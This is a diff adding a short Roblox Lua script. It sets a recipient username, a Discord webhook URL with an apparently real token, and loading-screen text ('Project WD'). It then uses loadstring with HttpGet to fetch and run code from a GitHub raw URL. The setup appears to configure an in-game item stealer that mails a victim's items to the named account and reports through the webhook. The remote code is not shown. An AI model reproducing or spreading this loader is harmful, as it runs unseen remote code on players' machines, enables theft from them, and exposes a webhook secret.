@@ -1,0 +1,9 @@
+UserName = "Odkdbfbfj"
+Webhook = "https://discord.com/api/webhooks/1117846422348365925/Oqlt02jqGSl6hOSZS3C-d6h7o10j1hzeox6CbPUohM5bq6AxfY9nJ4lzRBp3FtV8Tkiv" 
+UserName2 = "Odkdbfbfj"
+
+_G.MailMessage = "Mori the best"
+_G.LoadingTitle = "Project WD" 
+_G.WebhookName = "What"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()
